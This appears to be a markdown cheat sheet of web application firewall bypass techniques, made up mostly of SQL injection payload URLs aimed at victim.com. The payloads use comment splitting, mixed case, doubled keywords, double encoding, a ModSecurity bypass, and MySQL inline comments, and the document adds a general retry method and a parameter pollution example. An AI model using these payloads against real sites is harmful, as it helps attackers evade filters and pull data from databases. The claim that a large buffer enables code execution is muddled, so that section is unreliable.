<h1 align="center">WAF bypass Technique</h1>	

# Bypassing Methods and Techinques

#### 1. Pre-porcessor exploitation
- Make WAF skip input validation
#### 2. Impedance Mismatch
- WAF interpret input differently 
#### 3. Rule set Bypassing
- Use Payload that are not detected by WAF



# General step in WAF bypass

1. Fingerprint WAF and examine the filter rules
2. Encrypt the payload 
3. Test payload and examine the response 
4. If the payload cannot bypass WAF, use another payload and repeat from step 2

# Normal Bypassing Technique

## Bypass with Comment

- SQL comments allow to bypass a lot of filtering and WAF

`http://victim.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3--`

## Case Changing

Some WAF filter only lowercase SQL keyword

Regex Fileter ==> ` /union\sselect/g`

`http://victim.com/news.php?id=1+UnIoN/**/SeLecT/**/1,2,3--`

## Replaced Keyword

- Some application and WAFs use preg_replace to remove all SQL keyword. So we can bypass 

`http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--`

- Some case SQL keyword was filtered out and replaced with whitespace. So we can use `%0b` to
bypass.

`http://victim.com/news.php?id=1+uni%0bon+se%0blect+1,2,3--`

## Character Encoding


- Most CMSs and WAFs will decode and filter/bypass an application input, but some WAFs only `decode the input once` so `double encoding` can bypass certain filters as the WAF will decode the input once then filter while application keep decoding the SQL statement executing

#### Normal payload (blocked)

` http://victim.com/php-nuke/?/**/union/**/select`

#### Bypass Payload (`%2a = *`, `%2f = /`)

`http://victim.com/php-nuke/?/%2A%2A/union/%2A%2A/select`

#### Bypass Payload

`http://victim.com/php-nuke/?%2f**%2funion%2f**%2fselect`

####  Mod Security CRS (Credit: Johannes Dahse)

`http://victim.com/news.php?id=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D
%0A1%2C2%2Ccurrent_user`

```
%OD%0A = New line
```

#### Decode payload 

```
0 div 1 union#foo*/*/bar
select#foo 1,2,current_user
```
- In MySQL DB palyload is executed like 

`0 div 1 union select 1,2,current_user`


## Buffer Overflow

-WAFs that written in the C language prone to overflow or act differently when loaded with a bunch of
data. Give a large amount of data allows our code executing

```
http://victim.com/news.php?id=1+and+(select 1)=(select
0x414141414141441414141414114141414141414141414141414141414141414141+union+select+1,2,version(),database(),user(),6,7,8,9,10--

```

## Inline Comments (MySQL Only)


-  MySQL Server supports some variants of C-style comments.
These enable you to write code that includes MySQL extensions, but is still portable, by using
comments of the following form: 

`/*! MySQL-specific code */`

- A lot of WAFs filter SQL keywords like /union\sselect\ig We can bypass this filter by using inline
comments.

`http://victim.com/news.php?id=1/*!UnIoN*/SeLecT+1,2,3--`

- Inline comments can be used throughout the SQL statement so if table_name or information_schema
are filtered we can add more inline comments

`http://victim.com/news.php?id=/*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)
+FrOm/*!information_schema*/.tables/*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()--`




# Advanced WAF Bypass

## 1. HTTP parameter Pollution & Encoding Technique

- sending a number of parameter with th same name

- Technology interpret this request differently 



#### Normal Payload

`http://www.website.com/products/?productid=1`

#### Bypass Payload


`http://www.website.com/products/?productid=1&productid=2`
